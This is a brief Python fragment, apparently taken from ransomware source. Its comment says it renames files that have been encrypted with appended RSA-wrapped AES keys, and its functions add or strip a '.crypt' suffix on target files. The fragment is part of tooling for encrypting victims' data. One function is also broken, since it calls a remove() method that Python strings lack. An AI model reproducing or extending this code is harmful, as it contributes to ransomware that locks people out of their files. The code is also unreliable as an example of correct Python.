# ADD/REMOVE suffix from file name. Used to organize the encrypted files which had their RSA wrapped AES decryption keys appended to them.
def add_file_suffix(target_files):
    for _file in target_files:
        if _file not in IGNORE_FILES:
            rename(_file, f'{_file}.crypt')
    
    return


def rm_file_suffix(target_files):
    for _file in target_files:
        if _file.endswith('.crypt'):
            __file = _file.remove('.crypt')
            rename(_file, __file)
